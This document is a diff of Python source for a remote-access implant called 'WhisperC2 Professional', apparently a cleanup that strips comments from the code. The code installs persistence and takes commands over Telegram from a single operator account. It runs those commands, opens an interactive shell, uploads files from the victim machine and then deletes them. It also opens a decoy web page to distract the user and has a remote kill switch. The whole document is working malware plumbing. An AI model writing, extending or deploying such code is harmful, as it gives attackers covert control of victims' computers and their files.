@@ -1,4 +1,3 @@
-```python
 #!/usr/bin/env python3
 # =============================================================================
 # WhisperC2 Professional – PID‑Based Override + Auto‑Topic Recreation
@@ -144,26 +143,23 @@ def save_topic_id(tid: int) -> None:
     TOPIC_ID_FILE.write_text(str(tid))
 
 def get_or_create_topic() -> int | None:
-    # 1. Try to reuse stored topic
     existing = load_topic_id()
     if existing:
         try:
             test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
             bot.delete_message(GROUP_CHAT_ID, test.message_id)
-            return existing          # stored topic still exists
+            return existing
         except:
             log("Stored topic not found – will create a new one")
-
-    # 2. Create a brand‑new topic (replaces the deleted one)
     try:
         new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
         tid = new_topic.message_thread_id
-        save_topic_id(tid)           # overwrites the old invalid topic ID
+        save_topic_id(tid)
         log(f"Created new topic {tid}")
         return tid
     except Exception as e:
         log(f"Topic creation failed: {e}")
-        return None                  # triggers main‑group fallback later
+        return None
 
 def install_persistence() -> bool:
     if not getattr(sys, 'frozen', False):
@@ -388,32 +384,22 @@ def execute_command(cmd_line: str, topic_id):
 # -----------------------------------------------------------------------------
 def main():
     try:
-        # 1. Send minimal "alive" ping
         bot.send_message(GROUP_CHAT_ID, f"⚡ **{SYSTEM_ID}** is starting…")
         log("Startup ping sent")
-
-        # 2. Kill old instance if running & save our PID
         kill_old_instance()
         save_pid()
-
-        # 3. Normal startup
         install_persistence()
         log("Persistence done")
-
         topic_id = None
         for _ in range(3):
             topic_id = get_or_create_topic()
             if topic_id: break
             time.sleep(2)
-
         if not topic_id:
             log("Could not create forum topic – falling back to main group")
             topic_id = None
             bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
-
         log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
-
-        # 4. Handler (unchanged)
         def _handler_wrapper(message):
             if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
                 return
@@ -423,10 +409,8 @@ def main():
             else:
                 if not message.text or HOSTNAME_PREFIX not in message.text:
                     return
-
             text = (message.text or "").strip()
             if not text: return
-
             if shell_active:
                 clean = text[1:] if text.startswith('/') else text
                 if clean.lower() == "exit":
@@ -438,20 +422,16 @@ def main():
                 else:
                     write_shell(clean)
                 return
-
             if text.startswith('/'): text = text[1:]
             response, file_path = execute_command(text, topic_id)
-
             reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
             if text.lower().startswith("die"):
                 bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
                 sys.exit(0)
-
             try:
                 bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
             except:
                 bot.reply_to(message, response, **reply_kwargs)
-
             if file_path and os.path.exists(file_path):
                 try:
                     with open(file_path, 'rb') as f:
@@ -461,16 +441,13 @@ def main():
                 finally:
                     try: os.remove(file_path)
                     except: pass
-
         @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
         def _handler(msg):
             _handler_wrapper(msg)
-
         threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
         send_telemetry(topic_id, "online")
         log("Polling…")
         bot.infinity_polling(timeout=30, long_polling_timeout=30)
-
     except Exception as fatal:
         crash_log(f"Fatal error: {traceback.format_exc()}")
         try:
@@ -480,4 +457,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
